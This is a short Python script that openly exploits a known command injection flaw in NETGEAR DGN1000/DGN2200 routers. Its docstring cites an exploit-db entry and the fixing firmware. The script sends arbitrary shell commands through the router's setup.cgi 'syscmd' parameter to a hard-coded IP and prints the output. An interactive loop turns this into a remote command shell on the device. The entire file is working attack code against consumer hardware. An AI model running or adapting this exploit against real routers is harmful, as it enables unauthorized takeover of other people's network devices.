import urllib.request

"""
This script uses a command injection vulnerability in NETGEAR DGN1000/DGN2200 to execute commands on the router.
The vulnerability is fixed in firmware version 1.1.00.48.
See https://www.exploit-db.com/exploits/25978/ for more information.
"""

router_ip = "192.168.0.1"


def run_command(cmd):
    r = urllib.request.urlopen(
        "http://{}/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd={}"
        "&curpath=/&currentsetting.htm=1".format(
            router_ip, urllib.parse.quote(cmd)
        )
    )
    for line in r.readlines():
        print(line.decode('utf-8', 'ignore').rstrip())
    print()


while True:
    run_command(input())
